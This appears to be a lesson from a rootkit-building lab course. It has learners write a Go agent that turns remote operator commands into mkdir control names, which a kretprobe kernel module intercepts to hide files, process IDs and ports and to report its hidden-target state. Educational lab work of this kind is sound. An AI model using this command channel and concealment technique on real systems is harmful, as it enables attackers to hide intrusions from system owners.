# L16: mkdir Bridge

## Mission

The operator needs to send commands to the kernel module remotely. The module
only speaks mkdir names. The agent translates between them.

Translate authenticated operator commands into the module's mkdir control names,
then use the same channel to read its live in-memory state. The agent remains
userspace-only; the provided M01 module performs the kernel action.

L15 connects the agent to the server with an encrypted WebSocket, but it just
sends one hello and exits.

The kernel module listens for mkdir commands. The agent needs to translate
server instructions into mkdir calls.

## What you will observe

An authenticated `HIDE FILE` command crosses from the host server into the Go
agent, becomes a mkdir control name, and changes what the guest can list. An
`INFO` command travels through the same syscall and returns the module's live
target ledger; several commands must work across multiple messages.

## Workspace

```text
exercises/L16-mkdir-bridge
├── go.mod
├── go.sum
└── main.go
```

Only `main.go` is editable. The runner builds the M01 reference module, loads
it, then starts your agent.

## The bridge pattern

The server speaks JSON commands over the encrypted WebSocket. The kernel module
speaks mkdir names. The agent translates between them.

```text
Server                            Agent                           Kernel
  |                                 |                               |
  | {op:"HIDE FILE"} -------------->|                               |
  | (encrypted WS)                  |                               |
  |                                 | os.Mkdir                      |
  |                                 | "rklings.h.f.x"               |
  |                                 |                               [kretprobe]
  |                                 |                               target_add("x")
  |                                 |                               |
  | {op:"INFO"} ------------------->|                               |
  |                                 | mkdir syscall --------------->|
  |                                 | "rklings.info"                |
  |                                 |<- state in buffer  -----------|
  |<- {state:"..."}  ---------------|                               |
```

## Command mapping

The server sends JSON commands with an `op` field and an optional `arg` field.
The agent maps each to a mkdir name:

```text
Server op + arg            mkdir name
--------------             ----------
PING                       rklings.ping
STATUS                     rklings.status
INFO                       rklings.info (response in the input buffer)
HIDE FILE <name>           rklings.h.f.<name>
HIDE PID <pid>             rklings.h.i.<pid>
HIDE PORT <port>           rklings.h.p.<port>
QUIT                       rklings.quit
```

These are the commands the lab server sends in this exercise. L17 adds the full
command set.

## Issuing commands with os.Mkdir

Go's `os.Mkdir` issues the mkdir syscall. The kernel module's kretprobe
intercepts it before the real mkdir runs, so the directory is never created and
the command is dispatched.

```go
err := os.Mkdir("rklings.h.f.secret.txt", 0)
```

The permission mode does not matter because the kernel consumes the matching
name before a directory appears on disk. Use 0 for clarity.

Most commands need only a success or error result. `INFO` is different: the
agent must read data back from the kernel.

The agent passes a writable byte buffer whose first bytes spell `rklings.info`.
The module replaces the buffer contents with a snapshot of its live state:

```text
before syscall              after syscall
+----------------------+    +-----------------------------+
| rklings.info\0       │    | module_hidden=1\n           |
| remaining capacity   | -> | file=secret.txt\n           |
│                      │    | port=8443\n\0               |
+----------------------+    +-----------------------------+
```

The syscall return value is the response length. `os.Mkdir` discards a
successful return value, so `INFO` needs a raw syscall call that preserves it.
Go provides `unix.Syscall` from the `golang.org/x/sys/unix` package for this:

```go
length, _, errno := unix.Syscall(unix.SYS_MKDIR,
    uintptr(unsafe.Pointer(&buffer[0])), 0, 0)
runtime.KeepAlive(buffer)
```

`unsafe.Pointer` converts the buffer address to a value the syscall accepts.
`uintptr` is the integer type that holds a pointer-sized value.
`runtime.KeepAlive(buffer)` prevents the garbage collector from freeing the
buffer before the syscall returns, because `unsafe.Pointer` does not keep the
buffer reachable. The buffer is caller-owned memory; no procfs file, device,
socket, or second ledger is created.

## TODOs

```text
TODO 1  main.go  query rklings.info with a writable buffer
TODO 2  main.go  translate server command to mkdir name
```

### TODO 1 -- Query kernel state

Fill a byte buffer whose first bytes spell `rklings.info`, issue the mkdir
syscall with `unix.Syscall(unix.SYS_MKDIR, ...)`, and return the response bytes.
The return value is the response length. Use `runtime.KeepAlive(buffer)` after
the syscall to prevent the garbage collector from collecting the buffer during
the call.

### TODO 2 -- Translate server commands

The `translate` function receives a reconstructed command line (op + arg joined
with a space). Split it with `strings.SplitN(line, " ", 3)`. `parts[0]` is the
verb, `parts[1]` the target type, and `parts[2]` the argument. Return the
matching mkdir name from the command mapping table above, or an empty string for
unknown commands.

## Test it

Start the independent lab server in one host terminal:

```console
$ ./rklings serve L16
```

Build and boot the target in another:

```console
$ ./rklings run L16
```

The kernel module is loaded in the VM and the agent connects to the host. Create
a visible target in the VM:

```console
root@victim:~# echo "this file still exists" > /tmp/secret.txt
root@victim:~# ls /tmp/secret.txt
/tmp/secret.txt
```

Open `http://127.0.0.1:8080` and send:

```
HIDE FILE secret.txt
```

In the VM:

```console
root@victim:~# ls /tmp/
root@victim:~# cat /tmp/secret.txt
this file still exists
```

The file disappears from `ls` but remains directly accessible. The agent
translated the server command to `mkdir rklings.h.f.secret.txt`, and the kernel
module hid it.

Stop `run` and `serve` with `Ctrl+C` when finished.

## Validate

```
$ ./rklings validate L16
  [+] Server HIDE FILE command hides a file via mkdir
  [+] INFO returns the kernel's in-memory target ledger
  [+] Agent processes multiple commands in sequence
  PASS
```

## Next

One remote action works, but every action is still hardcoded. L17 lets the
operator choose commands such as status, concealment, persistence, and
escalation over the existing connection.
